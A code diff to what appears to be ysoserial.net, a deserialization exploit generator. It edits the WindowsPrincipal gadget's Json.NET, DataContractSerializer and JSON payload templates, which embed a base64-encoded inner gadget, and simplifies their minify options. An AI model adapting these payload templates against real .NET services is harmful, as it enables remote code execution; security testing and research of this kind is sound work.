@@ -7,6 +7,8 @@ using System.Runtime.Serialization;
 using System.Runtime.Serialization.Formatters.Binary;
 using System.Security.Claims;
 using System.Security.Principal;
+using System.Xml;
+using System.Xml.Linq;
 using ysoserial.Helpers;
 
 namespace ysoserial.Generators
@@ -79,9 +81,9 @@ namespace ysoserial.Generators
             else if (formatter.ToLower().Equals("json.net"))
             {
                 string payload = @"{
-                    '$type': 'System.Security.Principal.WindowsPrincipal, mscorlib',
+                    '$type': 'System.Security.Principal.WindowsPrincipal',
                     'Identity':{
-                        '$type':'System.Security.Principal.WindowsIdentity, mscorlib',
+                        '$type':'System.Security.Principal.WindowsIdentity',
                         'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                     }
                 }";
@@ -113,7 +115,7 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                string payload = $@"<root type=""System.Security.Principal.WindowsPrincipal, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+                string payload = $@"<root type=""System.Security.Principal.WindowsPrincipal"">
     <WindowsPrincipal xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"" xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" >
         <m_identity>
             <System.Security.ClaimsIdentity.actor i:type=""a:string"" xmlns="""" xmlns:a=""http://www.w3.org/2001/XMLSchema"" >
@@ -123,16 +125,9 @@ namespace ysoserial.Generators
     </WindowsPrincipal>
 </root>";
 
-                if (inputArgs.Minify)
-                {
-                    if (inputArgs.UseSimpleType)
-                    {
-                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
-                    }
-                    else
-                    {
-                        payload = XMLMinifier.Minify(payload, null, null);
-                    }
+                // just remove spaces, not xmlns attribute values, also no xxe here kids
+                if (inputArgs.Minify) {
+                    payload = XElement.Parse(payload).ToString(SaveOptions.DisableFormatting);
                 }
 
                 if (inputArgs.Test)
@@ -190,17 +185,8 @@ namespace ysoserial.Generators
             {
                 string payload = "{\"__type\":\"WindowsPrincipal:#System.Security.Principal\",\"m_identity\":{\"System.Security.ClaimsIdentity.actor\":\"" + b64encoded + "\"}}";
 
-                if (inputArgs.Minify)
-                {
-                    if (inputArgs.UseSimpleType)
-                    {
-                        payload = XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
-                    }
-                    else
-                    {
-                        payload = XMLMinifier.Minify(payload, null, null);
-                    }
-                }
+                // this is unsupported for this formatter
+                if (inputArgs.Minify || inputArgs.UseSimpleType){}
 
                 if (inputArgs.Test)
                 {
@@ -267,11 +253,8 @@ namespace ysoserial.Generators
     [Serializable]
     public class WindowsPrincipalMarshal : ISerializable
     {
-
         public WindowsPrincipalMarshal() { }
-
         public WindowsIdentity wi { get; set; }
-
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             info.SetType(typeof(WindowsPrincipal));
